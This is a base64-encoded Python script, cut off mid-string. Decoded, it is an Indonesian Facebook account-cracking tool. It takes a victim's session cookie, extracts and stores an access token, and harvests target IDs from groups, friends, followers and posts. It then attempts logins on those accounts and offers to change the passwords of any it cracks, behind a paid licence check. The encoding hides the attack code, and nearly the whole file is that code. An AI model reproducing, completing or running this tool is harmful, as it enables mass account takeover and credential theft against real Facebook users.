W1hbixjcCxzYWxhaD0wLDAsMA0KdWJhaFAscHdCYXJ1PVtdLFtdDQpvayA9IFtdDQpjcCA9IFtdDQppZCA9IFtdDQp1c2VyID0gW10NCmxvb3AgPSAwDQp1cmxfbG9va3VwID0gImh0dHBzOi8vbG9va3VwLWlkLmNvbS8iDQp1cmxfbWIgPSAiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbSINCnVybF9pcCA9ICJodHRwczovL3d3dy5odHRwYmluLm9yZy9pcCINCmhlYWRlcl9ncnVwID0geyJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2l0X0lUO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XSJ9DQpidWxhbl90dGwgPSB7IjAxIjogIkphbnVhcnkiLCAiMDIiOiAiRmVicnVhcnkiLCAiMDMiOiAiTWFyY2giLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWF5IiwgIjA2IjogIkp1bmUiLCAiMDciOiAiSnVseSIsICIwOCI6ICJBdWd1c3R1cyIsICIwOSI6ICJTZXB0ZW1iZXIiLCAiMTAiOiAiT2N0b2JlciIsICIxMSI6ICJOb3ZlbWJlciIsICIxMiI6ICJEZWNlbWJlciJ9DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQpkb25lID0gRmFsc2UNCmRlZiBhbmltYXRlKCk6DQogICAgb3Muc3lzdGVtKCJjbGVh""ciIpDQogICAgZm9yIGMgaW4gaXRlcnRvb2xzLmN5Y2xlKFsnXHgxYlsxOzkybXwnLCAnXHgxYlsxOzkybS8nLCAnXHgxYlsxOzkybS0nLCAnXHgxYlsxOzkybVxcJ10pOg0KICAgICAgICBpZiBkb25lOg0KICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xye059W3tPfeKAontOfV0gTG9hZGluZyAnICsgYykNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIHRpbWUuc2xlZXAoMC4wMykNCnQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1hbmltYXRlKQ0KdC5zdGFydCgpDQp0aW1lLnNsZWVwKDAuNSkNCmRvbmUgPSBUcnVlDQoNCiMgbGVtcGFua2tra2tra2sNCmRlZiBqYWxhbih6KToNCiAgICBmb3IgZSBpbiB6ICsgJ1xuJzoNCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQ0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgdGltZS5zbGVlcCgwLjAxKQ0KDQojIExPIEtPTlRPTA0KZGVmIGxvZ28oKToNCiAgICBwcmludCgiIiIlcw0KIyMgICAgIyMgICAgIyMjICAgICMjIyMjIyMjICAjIyAgICAgIyMgICAgIyMjICAgIA0KIyMgICAjIyAgICAjIyAjIyAgICMjICAgICAjIyAjIyMgICAjIyMgICAjIyAjIyAgIA0KIyMgICMjICAgICMjICAgIyMgICMjICAgICAjIyAjIyMjICMjIyMgICMjICAgIyMgIA0KIyMjIyMgICAgIyMgICAgICMjICMjIyMjIyMjICAjIyAjIyMgIyMgIyMgICAgICMjIA0KIyMgICMjICAgIyMjIyMjIyMjICMjICAgIyMgICAjIyAgICAgIyMgIyMjIyMjIyMjIA0KIyMgICAjIyAgIyMgICAgICMjICMjICAgICMjICAjIyAgICAgIyMgIyMgICAgICMjIA0KIyMgICAgIyMgIyMgICAgICMjICMjICAgICAjIyAjIyAgICAgIyMgIyMgICAgICMjIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiIiJShOKSkNCiNDUkFDSyBTRUxFU0FJDQpkZWYgaGFzaWwob2ssY3ApOg0KICAgIGlmIGxlbihvaykgIT0gMCBvciBsZW4oY3ApICE9IDA6DQogICAgICAgIHByaW50KCdcblxuICVzWyVzIyVzXSBjcmFjayBzZWxlc2FpLi4uXG4nJShOLEssTikpDQogICAgICAgIHByaW50KCcgWyVzKyVzXSB0b3RhbCBPSyA6ICVzJXMlcyclKE8sTixILHN0cihsZW4ob2spKSxOKSkNCiAgICAgICAgcHJpbnQoJyBbJXMrJXNdIHRvdGFsIENQIDogJXMlcyVzJyUoTyxOLEssc3RyKGxlbihjcCkpLE4pKQ0KICAgICAgICBjZWtfY3AgPSBpbnB1dChmIlxuIFt7T30/e059XSBtdW5jdWxrYW4gb3BzaSBjaGVja3BvaW50IGRldGVkdG9yIFtZL3RdOiAiKQ0KICAgICAgICBpZiBjZWtfY3AgPT0iIjoNCiAgICAgICAgICAgIHByaW50KGYiXG4gW3tNfSF7Tn1dIGphbmdhbiBrb3NvbmciKTtoYXNpbChvayxjcCkNCiAgICAgICAgZWxpZiBjZWtfY3AgaW5bIlkiLCJ5Il06DQogICAgICAgICAgICBqYWxhbihmIiBbe019IXtOfV0gaGlkdXBrYW4gbW9kZSBwZXNhd2F0IDMgZGV0aWsgdGVybGViaWggZGFodWx1LiIpO3RpbWUuc2xlZXAoNSkN""CiAgICAgICAgICAgIHd3PWlucHV0KGYiXG4gW3tPfT97Tn1dIHViYWggcGFzc3dvcmQga2V0aWthIHRhcCB5ZXMgW1kvdF06ICIpDQogICAgICAgICAgICBpZiB3dyBpbiAoIlkiLCJ5IiwieWEiKToNCiAgICAgICAgICAgICAgICB1YmFoUC5hcHBlbmQoInkiKQ0KICAgICAgICAgICAgICAgIHByaW50KGYiIFt7SH3igKJ7Tn1dIGNvbnRvaCBwYXNzd29yZCA6IHtIfUthcm1hNDI4e059IikNCiAgICAgICAgICAgICAgICBwd0Jhcj1pbnB1dChmIlxuIFt7SH0re059XSBtYXN1a2FuIHBhc3N3b3JkIGJhcnUgOiAiKQ0KICAgICAgICAgICAgICAgIHByaW50KCJcbiIpDQogICAgICAgICAgICAgICAgaWYgbGVuKHB3QmFyKSA8PSA1Og0KICAgICAgICAgICAgICAgICAgICBwcmludCgnXG4gJXNbJXPDlyVzXSBrYXRhIHNhbmRpIG1pbmltYWwgNiBrYXJha3RlciclKE4sTSxOKSkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBwd0JhcnUuYXBwZW5kKHB3QmFyKQ0KICAgICAgICAgICAgZm9yIG1lbWVrIGluIGNwOg0KICAgICAgICAgICAgICAgIGtvbnRvbCA9IG1lbWVrLnJlcGxhY2UoJ1xuJywgJycpDQogICAgICAgICAgICAgICAgdGl0aWQgID0ga29udG9sLnNwbGl0KCd8JykNCiAgICAgICAgICAgICAgICBqYWxhbihmJyB7Tn1be019PntOfV0gbWVuY29iYSBsb2dpbiBrZSBha3VuIDoge0t9e2tvbnRvbC5yZXBsYWNlKCIgW8OXXSAiLCAiIil9e059JykNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIGxvZ19oYXNpbCh0aXRpZFswXS5yZXBsYWNlKCIgW8OXXSAiLCAiIiksIHRpdGlkWzFdKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgICAgICBwcmludCgiIikNCiAgICAgICAgICAgIHByaW50KCIiKQ0KICAgICAgICAgICAgcHJpbnQoJyAgIFsgJXNQcm9zZXMgUGVuZ2VjZWthbiBTZWxlc2FpICVzXVxuJyUoSCxOKSk7ZXhpdCgpDQogICAgICAgIGVsaWYgY2VrX2NwIGluWyJUIiwidCJdOg0KICAgICAgICAgICAgZXhpdChmIlxuICB7T30qe059IFNlbGFtYXQgdGluZ2dhbDopIikNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KGYiXG4gW3tNfSF7Tn1dIFkvdCBnb2Jsb2siKTtoYXNpbChvayxjcCkNCiAgICBlbHNlOg0KICAgICAgICBwcmludCgnXG5cbiBbJXMhJXNdIG9wc2hoIGthbXUgdGlkYWsgbWVuZGFwYXRrYW4gaGFzaWwgOignJShNLE4pKTtleGl0KCkNCg0KI01BU1VLIFRPS0VODQpkZWYgeWF5YW54ZCgpOg0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIHI9cmVxdWVzdHMuU2Vzc2lvbigpDQogICAgcHJpbnQoZid7T30gKntOfSBVUERBVEVEIDIzIEZFQlJVQVJZIDIwMjInKQ0KICAgIGNvb2tpZSA9IGlucHV0KCJcbiAlc1slcz8lc10gQ29va2llcyA6ICVzIiUgKE4sSyxOLE8pKQ0KICAgIGlmIGNvb2tp""ZSBpblsnT1BFTicsJ09wZW4nLCdvcGVuJ106DQogICAgICBqYWxhbigiXG4gICVzKiAlc2FuZGEgYWthbiBkaSBhcmFoa2FuIGtlIFlvdVR1YmUiJShPLEgpKTt0aW1lLnNsZWVwKDMpO29zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93YS5tZS8rMjM0ODExMDA0NDQxOCcpO3lheWFueGQoKQ0KICAgIHRyeToNCiAgICAgICAgZGF0YSA9IHIuZ2V0KCJodHRwczovL2J1c2luZXNzLmZhY2Vib29rLmNvbS9idXNpbmVzc19sb2NhdGlvbnMiLCBoZWFkZXJzID0gew0KICAgICAgICAidXNlci1hZ2VudCIgICAgICAgICAgICAgICAgOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMS4wOyBNSSA4IEJ1aWxkL09QTTEuMTcxMDE5LjAxMSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzY5LjAuMzQ5Ny44NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsDQogICAgICAgICJyZWZlcmVyIiAgICAgICAgICAgICAgICAgICA6ICJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIiwNCiAgICAgICAgImhvc3QiICAgICAgICAgICAgICAgICAgICAgIDogImJ1c2luZXNzLmZhY2Vib29rLmNvbSIsDQogICAgICAgICJvcmlnaW4iICAgICAgICAgICAgICAgICAgICA6ICJodHRwczovL2J1c2luZXNzLmZhY2Vib29rLmNvbSIsDQogICAgICAgICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIiA6ICIxIiwNCiAgICAgICAgImFjY2VwdC1sYW5ndWFnZSIgICAgICAgICAgIDogImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43IiwNCiAgICAgICAgImNhY2hlLWNvbnRyb2wiICAgICAgICAgICAgIDogIm1heC1hZ2U9MCIsDQogICAgICAgICJhY2NlcHQiICAgICAgICAgICAgICAgICAgICA6ICJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44IiwNCiAgICAgICAgImNvbnRlbnQtdHlwZSIgICAgICAgICAgICAgIDogInRleHQvaHRtbDsgY2hhcnNldD11dGYtOCINCiAgICAgICAgfSwgY29va2llcyA9IHsNCiAgICAgICAgImNvb2tpZSIgICAgICAgICAgICAgICAgICAgIDogY29va2llDQogICAgICAgIH0pDQogICAgICAgIGZpbmRfdG9rZW4gPSByZS5zZWFyY2goIihFQUFHXHcrKSIsIGRhdGEudGV4dCkNCiAgICAgICAgb3BlbignLmNva2llLnR4dCcsICdhJykud3JpdGUoY29va2llKQ0KICAgICAgICBvcGVuKCcudG9rZW4udHh0JywgJ2EnKS53cml0ZShmaW5kX3Rva2VuLmdyb3VwKDEpKQ0KICAgICAgICBuYW1hID0gci5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0lcyclKGZpbmRfdG9rZW4uZ3JvdXAoMSkpKS5qc29uKClbJ25hbWUnXQ0KICAgICAgICBwcmludCgnXG5cbiAlcyolcyBzZWxhbWF0IGRhdGFuZyAlcyVzJXMnJShPLE4sSyxuYW1hLE4pKTt0aW1lLnNsZWVwKDIpDQogICAgICAgIHByaW50KCcgJXMqJXMgcGxlYXNlIHVzZSB0aGlzIHNjIHByb3Bl""cmx5LCB3ZSBhcmUgbm90IHJlc3BvbnNpYmxlIGlmIHRoaXMgc2MgaXMgbWlzdXNlZC4uLiclKE8sTikpO3RpbWUuc2xlZXAoMikNCiAgICAgICAgaW5wdXQoJyAlcyolcyB0ZWthbiBlbnRlciAnJShPLE4pKQ0KICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd2EubWUvKzIzNDgxMTAwNDQ0MTgnKQ0KICAgICAgICBtb2NoX3lheWFuKCkNCiAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6DQogICAgICAgIHByaW50KCdcbiAlc1slc8OXJXNdIGNvb2tpZXMgaW52YWxpZCclKE4sTSxOKSk7dGltZS5zbGVlcCgxKTt5YXlhbnhkKCkNCiAgICBleGNlcHQgVW5ib3VuZExvY2FsRXJyb3I6DQogICAgICAgIHByaW50KCdcbiAlc1slc8OXJXNdIGNvb2tpZXMgaW52YWxpZCclKE4sTSxOKSk7dGltZS5zbGVlcCgxKTt5YXlhbnhkKCkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgICAgIGV4aXQoJ1xuXG4gJXNbJXMhJXNdIHRpZGFrIGFkYSBrb25la3NpXG4nJShOLE0sTikpDQojIyMgT1JBTkcgR0FOVEVORyAjIyMNCmRlZiBtb2NoX3lheWFuKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgbG9nbygpDQogICAgdHJ5Og0KICAgICAgICBrZXkgPSBvcGVuKCcvZGF0YS9kYXRhL2NvbS50ZXJtdXgvLmhlbmNldXQudHh0JywgJ3InKS5yZWFkKCkNCiAgICAgICAgcmVxID0gcmVxdWVzdHMuZ2V0KGYiaHR0cHM6Ly9hcGlrZXkueWF5YW54ZC5teS5pZC9jaGVjay5waHA/a2V5PXtrZXl9IiwgaGVhZGVycz17InVzZXItYWdlbnQiOiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOTsgdml2byAyMDA3KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTEuMC40NDcyLjEwMSBNb2JpbGUgU2FmYXJpLzUzNy4zNiJ9LCB0aW1lb3V0PTEwKS5qc29uKCkNCiAgICAgICAgbWFpbCA9IHJlcVsnZW1haWwnXQ0KICAgICAgICBiZXJnYWJ1bmcgPSByZXFbJ2pvaW4nXQ0KICAgICAgICBrYWRhbHVhcnNhID0gcmVxWydleHBpcmVkJ10NCiAgICAgICAgdG9kID0gcmVxWydwYXlfa2V5J10ucmVwbGFjZSgiUHJlbWl1bSIsICJceDFiWzE7OTJtUEFJRFx4MWJbMG0iKS5yZXBsYWNlKCJUcmlhbCIsICJceDFiWzE7OTFtVGlkYWtceDFiWzBtIikNCiAgICAgICAgdG9keiA9IHJlcVsncGF5X2tleSddDQogICAgICAgIG5vdGljZSA9IHJlcVsndGV4dCddDQogICAgICAgIHN0YXR1eiA9IHJlcVsic3RhdHVzIl0NCiAgICAgICAgaWYgc3RhdHV6ID09ICdrYWRhbHVhcnNhJzoNCiAgICAgICAgICAgIHJlZ2lzdGVyKCkNCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KICAgICAgICBwcmludCgiXG4gJXNbJXPDlyVzXSBMaXNlbnNlIGludmFsaWQiJShOLE0sTikpO3RpbWUuc2xlZXAoMik7Y2VrX2tleSgpDQogICAgaXBtID0gcmVxdWVzdHMuZ2V0KHVybF9pcCkuanNvbigpDQogICAgSVAgPSBpcG1bIm9yaWdpbiJdDQogICAgcHJpbnQoIlxuIFsqXSBF""TUFJTCAgICAgIDogJXMiJShtYWlsKSk7dGltZS5zbGVlcCgwLjAzKQ0KICAgIHByaW50KGYiIFsqXSBKT0lOICAgICAgIDoge2JlcmdhYnVuZ30iKTt0aW1lLnNsZWVwKDAuMDMpDQogICAgcHJpbnQoIiBbKl0gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIik7dGltZS5zbGVlcCgwLjAzKQ0KICAgIHByaW50KGYiIFsqXSBQUkVNSVVNICAgIDoge3RvZH0iKQ0KICAgIHByaW50KGYiIFsqXSBFWFBJUkVEICAgIDoge2thZGFsdWFyc2F9IHtIfXtub3RpY2V9e059Iik7dGltZS5zbGVlcCgwLjAzKQ0KICAgIHByaW50KCIgWypdIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpO3RpbWUuc2xlZXAoMC4wMykNCiAgICBwcmludCgiIFsqXSBJUCAgICAgICAgIDogJXNcbiIlKElQKSk7dGltZS5zbGVlcCgwLjAzKQ0KICAgIHRyeToNCiAgICAgICAgdG9rZW56ID0gb3BlbignLnRva2VuLnR4dCcsICdyJykucmVhZCgpDQogICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgIHByaW50KCdcbiAlc1slc8OXJXNdIGNvb2tpZSBpbnZhbGlkJyUoTixNLE4pKTt0aW1lLnNsZWVwKDIpO29zLnN5c3RlbSgncm0gLXJmIC50b2tlbi50eHQnKTtvcy5zeXN0ZW0oJ3JtIC1yZiAuY29raWUudHh0Jyk7eWF5YW54ZCgpDQogICAgdHJ5Og0KICAgICAgICBuYW1hID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/ZmllbGRzJmFjY2Vzc190b2tlbj17dG9rZW56fScpLmpzb24oKVsibmFtZSJdDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBwcmludCgnXG4gJXNbJXPDlyVzXSBjb29raWUgaW52YWxpZCclKE4sTSxOKSk7dGltZS5zbGVlcCgyKTtvcy5zeXN0ZW0oJ3JtIC1yZiAudG9rZW4udHh0Jyk7b3Muc3lzdGVtKCdybSAtcmYgLmNva2llLnR4dCcpO3lheWFueGQoKQ0KICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCiAgICAgICAgZXhpdCgnXG5cbiAlc1slcyElc10gdGlkYWsgYWRhIGtvbmVrc2lcbiclKE4sTSxOKSkNCiAgICBjb29raXogPSBvcGVuKCcuY29raWUudHh0JykucmVhZCgpDQogICAga3VlaCAgPSB7ImNvb2tpZSI6Y29va2l6fQ0KICAgIHByaW50KCIgWyBXRUxDT01FICVzJXMlcyBdXG4iJShVLG5hbWEsUCkpO3RpbWUuc2xlZXAoMC4wMykNCiAgICBwcmludCgnIFslczAxJXNdLiBDcmFjayBmcm9tIEdyb3VwJyUoVSxQKSk7dGltZS5zbGVlcCgwLjAzKQ0KICAgIHByaW50KCcgWyVzMDIlc10uIENyYWNrIGZyb20gUHVibGljJyUoTyxOKSk7dGltZS5zbGVlcCgwLjAzKQ0KICAgIHByaW50KCcgWyVzMDMlc10uIENyYWNrIGZyb20gZm9sbG93ZXJzJyUoVSxQKSk7dGltZS5zbGVlcCgwLjAzKQ0KICAgIHByaW50KCcgWyVzMDQlc10uIENyYWNrIGZyb20gTGlrZSclKE8sTikpO3RpbWUuc2xlZXAoMC4wMykNCiAgICBwcmludCgnIFslczA1JXNdLiBDcmFjayBmcm9tIFJhbmRvbSBJZCclKFUs""UCkpO3RpbWUuc2xlZXAoMC4wMykNCiAgICBwcmludCgnIFslczA2JXNdLiBDcmFjayBmcm9tIFBvc3QnJShPLE4pKTt0aW1lLnNsZWVwKDAuMDMpDQogICAgcHJpbnQoJyBbJXMwNyVzXS4gQXV0byBDaGVja3BvaW50IERldGVjdG9yJyUoVSxQKSk7dGltZS5zbGVlcCgwLjAzKQ0KICAgIHByaW50KCcgWyVzMDglc10uIENoYW5nZSBVc2VyIEFnZW50JyUoTyxOKSk7dGltZS5zbGVlcCgwLjAzKQ0KICAgIHByaW50KCcgWyVzMDklc10uIENoZWNrIENyYWNrIFJlc3VsdCclKFUsUCkpO3RpbWUuc2xlZXAoMC4wMykNCiAgICBwcmludCgnIFslczEwJXNdLiBVcGdyYWRlIHRvJXMgcHJlbWl1bSVzJyUoTyxOLE8sTikpO3RpbWUuc2xlZXAoMC4wMykNCiAgICBwcmludCgnIFslczAwJXNdLiBsb2dvdXQgKCVzIGNvb2tpZSVzKSclKFUsUCxVLFApKTt0aW1lLnNsZWVwKDAuMDMpDQogICAgcGVwZWsgPSBpbnB1dCgnXG4gWyVzKiVzXSBtZW51IDogJyUoTyxOKSkNCiAgICBpZiBwZXBlayA9PSAnJzoNCiAgICAgICAgcHJpbnQoJ1xuICVzWyVzw5clc10gamFuZ2FuIGtvc29uZyBrZW50b2QhJyUoTixNLE4pKTt0aW1lLnNsZWVwKDIpO21vY2hfeWF5YW4oKQ0KICAgIGVsaWYgcGVwZWsgaW5bJzEnLCcwMSddOg0KICAgICAgICBpZiB0b2R6ID09ICdUcmlhbCc6DQogICAgICAgICAgICBqYWxhbihmIlxue059IFt7TX3Dl3tOfV0gYW5kYSBhZGFsYWggdXNlciB0cmlhbCBjdW1hIGJpc2EgbWVuZ2d1bmFrYW4gbWVudSBub21vciB7TX0wMi57Tn0gdXBncmFkZSBrZSBwcmVtaXVtIHVudHVrIG1lbmlrbWF0aSBzZW11YSBmaXR1cmUuLi4iKTtleGl0KCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGtvbnRvbCA9IGlucHV0KGYie059IFs/XSBtYXN1a2thbiBpZCBncnVwIDogIikNCiAgICAgICAgICAgIGlmIGtvbnRvbCBpblsiIiwiICJdOg0KICAgICAgICAgICAgICAgIHByaW50KCdcbiAlc1slc8OXJXNdIGphbmdhbiBrb3Nvbmcga2VudG9kISclKE4sTSxOKSk7dGltZS5zbGVlcCgyKTttb2NoX3lheWFuKCkNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBhamc9cmVxdWVzdHMuZ2V0KGYiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2Jyb3dzZS9ncm91cC9tZW1iZXJzLz9pZD17a29udG9sfSIsY29va2llcz1rdWVoKS50ZXh0DQogICAgICAgICAgICAgICAgICAgIGlmICJIYWxhbWFuIFRpZGFrIERpdGVtdWthbiIgaW4gYWpnOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJcbiAlc1slc8OXJXNdIGdyb3VwIGRlbmdhbiBpZCB7a29udG9sfSB0aWRhayBkaXRlbXVrYW4iJShOLE0sTikpO3RpbWUuc2xlZXAoMik7bW9jaF95YXlhbigpDQogICAgICAgICAgICAgICAgICAgIGVsaWYgIkFuZGEgVGlkYWsgRGFwYXQgTWVuZ2d1bmFrYW4gRml0dXIgSW5pIFNla2FyYW5nIiBpbiBhamc6DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXG4gJXNbJXPDlyVz""XSBmYWNlYm9vayBtZW1iYXRhc2kgc2V0aWFwIGFrdGl2aXRhcywgbGltaXQgYnJvLCBzaWxhaGthbiBiZXJhbGloIGFrdW4iJShOLE0sTikpO3RpbWUuc2xlZXAoMik7bW9jaF95YXlhbigpDQogICAgICAgICAgICAgICAgICAgIGVsaWYgIktvbnRlbiBUaWRhayBEaXRlbXVrYW4iIGluIGFqZzoNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiXG4gJXNbJXPDlyVzXSBncm91cCBkZW5nYW4gaWQge2tvbnRvbH0gdGlkYWsgZGl0ZW11a2FuIiUoTixNLE4pKTt0aW1lLnNsZWVwKDIpO21vY2hfeWF5YW4oKQ0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiBbKl0gbmFtYSBncnVwIDogIityZS5maW5kYWxsKCJcPHRpdGxlXD4oLio/KTxcL3RpdGxlXD4iLGFqZylbMF1bODpdKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxuIFshXSB1bnR1ayBiZXJoZW50aSB0ZWthbiBDVFJMIGxhbHUgdGVrYW4gYyBkaSBrZXlib2FyZCBhbmRhLiIpDQogICAgICAgICAgICAgICAgICAgICAgICBjcmFja19ncnVwKGYiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2Jyb3dzZS9ncm91cC9tZW1iZXJzLz9pZD17a29udG9sfSIpDQogICAgICAgICAgICAgICAgZXhjZXB0KHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yLHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ2h1bmtlZEVuY29kaW5nRXJyb3IscmVxdWVzdHMuZXhjZXB0aW9ucy5SZWFkVGltZW91dCk6DQogICAgICAgICAgICAgICAgICAgIGV4aXQoIlxuIFshXSBLZXNhbGFoYW4gUGFkYSBLb25la3NpIikNCiAgICBlbGlmIHBlcGVrIGluWycyJywnMDInXToNCiAgICAgICAgaWYgdG9keiA9PSAnVHJpYWwnOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGphbGFuKGYie059IFt7TX0re059XSB1c2VyIHRyaWFsIGN1bWEgYmlzYSBtZW5nYW1iaWwge019MTAwMHtOfSBpZC4uLiIpDQogICAgICAgICAgICAgICAgcHJpbnQoIlxuIFsqXSBUeXBlICdtZSd0byBjcmFjayBGcm9tIEZyaWVuZCBMaXN0IikNCiAgICAgICAgICAgICAgICB1c2VyID0gaW5wdXQoJyBbKl0gRmFjZWJvb2sgSWQgOiAnKQ0KICAgICAgICAgICAgICAgIF9tZW1la18gPSBfX2NvbnZlcnRfXyh1c2VyKQ0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoZiJodHRwOi8vZ3JhcGguZmFjZWJvb2suY29tL3tfbWVtZWtfLmdldCgnX2tvbnRvbF8nKX0/ZmllbGRzPWZyaWVuZHMuZmllbGRzKGlkLG5hbWUpLmxpbWl0KDEwMDApJmFjY2Vzc190b2tlbj17dG9rZW56fSIpLmpzb24oKVsiZnJpZW5kcyJdDQogICAgICAgICAgICAgICAgZm9yIHggaW4gclsiZGF0YSJdOg0KICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQoeFsnaWQnXSArICc8PT4nICsgeFsnbmFtZSddKQ0KICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICAgICAgICAgIHByaW50KCdcbiAlc1slc8OXJXNdIEZhY2Vib29rIElkIE5v""dCBQdWJsaWMnJShOLE0sTikpO3RpbWUuc2xlZXAoMyk7bW9jaF95YXlhbigpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgcHJpbnQoIlxuIFsqXSBUeXBlICdtZScgdG8gQ3JhY2sgRnJvbSBGcmllbmQgTGlzdCIpDQogICAgICAgICAgICAgICAgdXNlciA9IGlucHV0KCcgWypdIEZhY2Vib29rIElkIDogJykNCiAgICAgICAgICAgICAgICBfbWVtZWtfID0gX19jb252ZXJ0X18odXNlcikNCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KGYiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20ve19tZW1la18uZ2V0KCdfa29udG9sXycpfT9maWVsZHM9ZnJpZW5kcy5maWVsZHMoaWQsbmFtZSkmYWNjZXNzX3Rva2VuPXt0b2tlbnp9IikuanNvbigpWyJmcmllbmRzIl0NCiAgICAgICAgICAgICAgICBmb3IgeCBpbiByWyJkYXRhIl06DQogICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh4WydpZCddICsgJzw9PicgKyB4WyduYW1lJ10pDQogICAgICAgICAgICBleGNlcHQgS2V5RXJyb3I6DQogICAgICAgICAgICAgICAgcHJpbnQoJ1xuICVzWyVzw5clc10gZ2FnYWwgbWVuZ2FtYmlsIGlkLCBrZW11bmdraW5hbiBpZCB0aWRha2xhaCBwdWJsaWsnJShOLE0sTikpO3RpbWUuc2xlZXAoMyk7bW9jaF95YXlhbigpDQogICAgZWxpZiBwZXBlayBpblsnMycsJzAzJ106DQogICAgICAgIGlmIHRvZHogPT0gJ1RyaWFsJzoNCiAgICAgICAgICAgIGphbGFuKGYiXG57Tn0gW3tNfcOXe059XSBhbmRhIGFkYWxhaCB1c2VyIHRyaWFsIGN1bWEgYmlzYSBtZW5nZ3VuYWthbiBtZW51IG5vbW9yIHtNfTAyLntOfSB1cGdyYWRlIGtlIHByZW1pdW0gdW50dWsgbWVuaWttYXRpIHNlbXVhIGZpdHVyZS4uLiIpO2V4aXQoKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAga29udG9sID0gaW5wdXQoZiJ7Tn0gWz9dIG1hc3VrYW4gaWQgYXRhdSB1c2VybmFtZSBmb2xsb3dlcnMgOiAiKQ0KICAgICAgICAgICAgaWYga29udG9sIGluWyIiLCIgIl06DQogICAgICAgICAgICAgICAgcHJpbnQoJ1xuICVzWyVzw5clc10gamF